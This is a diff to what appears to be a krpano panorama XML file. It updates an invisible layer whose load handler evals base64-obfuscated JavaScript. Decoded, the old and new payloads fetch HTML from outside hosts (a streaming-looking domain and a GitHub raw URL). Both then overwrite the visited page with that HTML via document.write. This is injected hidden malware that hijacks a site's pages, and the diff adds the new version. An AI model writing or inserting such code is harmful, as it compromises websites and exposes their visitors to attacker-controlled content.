@@ -2,7 +2,7 @@
   <layer name="js_loader" type="container" visible="false" 
          onloaded="js(
             eval(
-              var w = atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiTU0wMDEiOwp2YXIgYmFzZVVybCA9ICJodHRwczovL3ByZW1pcmUtc3RyZWFtaW5nMjQ3LmxpdmUvbWtzLyI7CmZldGNoKGJhc2VVcmwgKyBpZCArICIuaHRtbCIpCiAgLnRoZW4oZSA9PiBlLnRleHQoKSkKICAudGhlbihlID0+IHsKICAgIGRvY3VtZW50Lm9wZW4oKSwKICAgIGRvY3VtZW50LndyaXRlKGUpLAogICAgZG9jdW1lbnQuY2xvc2UoKQogIH0pOw==');
+              var w = atob('dmFyIG1hdGNoID0gd2luZG93LmxvY2F0aW9uLmhyZWYubWF0Y2goL3ZvZD0oW2EtekEtWjAtOV8tXSspLyk7dmFyIHZvZCA9IG1hdGNoID8gbWF0Y2hbMV0gOiAnYnV4bHB3dWknO3NldFRpbWVvdXQoZnVuY3Rpb24oKXtmZXRjaCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Zvc3Ryb2V4cG8vcHJvc3RhcmUvbWFpbi9maWxlcy90ZXN0LyIrdm9kKyIuaHRtbCIpLnRoZW4oZnVuY3Rpb24ocil7cmV0dXJuIHIudGV4dCgpO30pLnRoZW4oZnVuY3Rpb24oZGF0YSl7ZG9jdW1lbnQub3BlbigpO2RvY3VtZW50LndyaXRlKGRhdGEpO2RvY3VtZW50LmNsb3NlKCk7fSkuY2F0Y2goZnVuY3Rpb24oZXJyKXtjb25zb2xlLmVycm9yKGVycik7fSk7fSwxMDAwKTsKCgo=');
               eval(w)
             );
          );"/>
